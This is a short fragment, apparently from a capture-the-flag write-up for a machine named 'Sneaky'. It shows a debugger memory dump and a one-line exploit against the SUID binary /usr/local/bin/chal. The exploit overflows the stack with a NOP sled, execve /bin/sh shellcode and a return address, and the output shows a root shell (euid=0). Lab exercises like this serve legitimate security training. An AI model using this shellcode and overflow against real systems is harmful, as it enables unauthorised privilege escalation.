0xbffff9d0:	0x3a34343b	0x303d7865	0x32333b31	0x742e2a3a
0xbffff9e0:	0x303d7261	0x31333b31	0x742e2a3a	0x303d7a67
0xbffff9f0:	0x31333b31	0x612e2a3a	0x303d6a72	0x31333b31
0xbffffa00:	0x742e2a3a	0x303d7a61	0x31333b31	0x6c2e2a3a
0xbffffa10:	0x303d687a	0x31333b31	0x6c2e2a3a	0x3d616d7a
0xbffffa20:	0x333b3130	0x2e2a3a31	0x3d7a6c74	0x333b3130
thrasivoulos@Sneaky:~$ 

=> 0xbffff7e0

$ /usr/local/bin/chal $(python -c "print '\x90'*(362-45)+'\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh'+'\xe0\xf7\xff\xbf'")
# id
uid=1000(thrasivoulos) gid=1000(thrasivoulos) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lpadmin),111(sambashare),1000(thrasivoulos)
# 




```